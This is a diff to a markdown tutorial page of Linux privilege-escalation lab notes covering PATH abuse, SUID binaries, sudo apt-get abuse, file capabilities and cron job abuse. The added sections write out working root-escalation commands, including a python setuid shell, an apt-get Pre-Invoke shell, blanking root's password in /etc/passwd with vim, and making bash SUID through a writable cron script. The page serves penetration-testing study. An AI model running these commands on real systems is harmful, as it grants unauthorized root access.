@@ -139,7 +139,7 @@ echo $PATH
 
 <figure><img src="../../.gitbook/assets/image (1827).png" alt=""><figcaption></figcaption></figure>
 
-### Path Abuse + Sudo Misconfiguration&#x20;
+### Case - 2: Path Abuse + Sudo Misconfiguration&#x20;
 
 **Scenario:** _After the previous vulnerability, the system administrator became more cautious and removed all the vulnerable SUID binaries. Instead, they consolidated all the required cleanup operations into a single shell script and granted users `sudo` access only to that script for cleaning the system. However, as attackers, we discovered that the `secure_path` option is disabled in this lab, allowing us to exploit the script through PATH abuse. Let's get started._
 
@@ -185,4 +185,213 @@ which find
 {% hint style="info" %}
 _only disabled `secure-path` will allow us to escalate privileges using path abuse + Sudo misconfiguration._&#x20;
 {% endhint %}
+
+## Special Permissions&#x20;
+
+The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`
+
+#### Find files with suid bit set&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1833).png" alt=""><figcaption></figcaption></figure>
+
+#### Find executable in GTFOBins&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1836).png" alt=""><figcaption></figcaption></figure>
+
+#### Escalate privileges&#x20;
+
+{% code overflow="wrap" %}
+```bash
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1835).png" alt=""><figcaption></figcaption></figure>
+
+## Sudo Rights Abuse&#x20;
+
+#### Check allowed root executables&#x20;
+
+We're given permission to run `apt-get`, which means we can execute any `apt-get` command, such as `apt-get update`, `apt-get install`, and others. That's why it's important to grant only specific commands in the `sudoers` file, such as `apt-get update`, to ensure the user can execute only that particular command and nothing else.
+
+<figure><img src="../../.gitbook/assets/image (1837).png" alt=""><figcaption></figcaption></figure>
+
+#### Check GTFOBins&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1838).png" alt=""><figcaption></figcaption></figure>
+
+#### Escalate privileges&#x20;
+
+{% code overflow="wrap" %}
+```bash
+apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1839).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+_Note that if only `apt-get update` is specified in the `sudoers` file, we cannot append any additional arguments or commands after `apt-get update`. This restriction makes it much more difficult to escalate privileges._
+{% endhint %}
+
+## Exploiting Capabilities&#x20;
+
+lab environment setup explained [here](../../prerequisites/os-essentials/linux-fundamentals/#set-capabilities)
+
+#### Enumerating Capabilities&#x20;
+
+{% code overflow="wrap" %}
+```bash
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1840).png" alt=""><figcaption></figcaption></figure>
+
+We can see that `python3.14` has the capability to `setuid`.&#x20;
+
+#### Identifying capabilities&#x20;
+
+{% code overflow="wrap" %}
+```bash
+getcap <executable>
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1841).png" alt=""><figcaption></figcaption></figure>
+
+#### Exploiting Capabilities&#x20;
+
+{% code overflow="wrap" %}
+```bash
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1842).png" alt=""><figcaption></figcaption></figure>
+
+<details>
+
+<summary><strong>Case 2</strong> </summary>
+
+### Enumerate Capabilities&#x20;
+
+{% code overflow="wrap" %}
+```bash
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1843).png" alt=""><figcaption></figcaption></figure>
+
+**`CAP_DAC_OVERRIDE`**: Bypasses Linux file read, write, and execute permission checks (DAC).
+
+### Checking all capabilities&#x20;
+
+{% code overflow="wrap" %}
+```bash
+getcap /usr/bin/vim.basic
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1844).png" alt=""><figcaption></figcaption></figure>
+
+### Exploiting Capabilities&#x20;
+
+Since we're allowed to read and write any file with vim. let's try to change passwd file.&#x20;
+
+{% code overflow="wrap" %}
+```bash
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1845).png" alt=""><figcaption></figcaption></figure>
+
+
+
+</details>
+
+## Cron Job Abuse&#x20;
+
+<details>
+
+<summary><strong>Create vulnerable environment</strong></summary>
+
+{% code overflow="wrap" %}
+```bash
+#!/bin/bash
+
+echo "Cleaning temporary files..."
+rm -rf /tmp/*.tmp 2>/dev/null
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+mkdir -p /opt/scripts
+chmod +x /opt/scripts/cleanup.sh
+chown root:user3 /opt/scripts/cleanup.sh
+ls -l /opt/scripts/cleanup.sh
+cat /opt/scripts/cleanup.sh
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1846).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+#### find cron jobs&#x20;
+
+{% code overflow="wrap" %}
+```bash
+cat /etc/crontab
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1847).png" alt=""><figcaption></figcaption></figure>
+
+#### check permissions&#x20;
+
+{% code overflow="wrap" %}
+```bash
+ls -l /opt/scripts/cleanup.sh
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1848).png" alt=""><figcaption></figcaption></figure>
+
+We can see that `user3` is group owner of the file and it has write permissions on it.&#x20;
+
+#### Replace the script
+
+Replace the script with:&#x20;
+
+{% code overflow="wrap" %}
+```bash
+cat > /opt/scripts/cleanup.sh << EOF
+#!/bin/bash
+
+chmod u+s /bin/bash
+EOF
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1849).png" alt=""><figcaption></figcaption></figure>
+
+#### Exploit&#x20;
+
+Wait until `bin/bash` get the suid bit set. then boom.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1850).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+**Note**&#x20;
+
+_Root cron jobs may be stored in the root user's personal crontab, which is not readable by low-privileged users. In such cases, tools like **pspy** can be used to identify scheduled tasks by observing processes executed by root._
+{% endhint %}
+
+## Using Automated tools
+
+### Using <kbd>Linux-Exploit-Suggester.sh</kbd>
 
